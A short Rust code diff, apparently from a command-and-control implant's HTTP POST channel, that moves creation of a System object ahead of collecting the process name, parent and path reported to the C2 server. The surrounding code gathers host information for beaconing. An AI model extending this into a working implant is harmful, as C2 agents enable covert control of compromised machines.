@@ -474,9 +474,9 @@ impl LinkFetch for HTTPPostC2Link {
         };
         let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
 
-        let (process_name, parent_name) = process_name_and_parent();
-        let process_path = process_path();
         let sys: System = System::new_all();
+        let (process_name, parent_name) = process_name_and_parent(&sys);
+        let process_path = process_path();
 
 
         let mut post_data: PostToC2 = PostToC2{
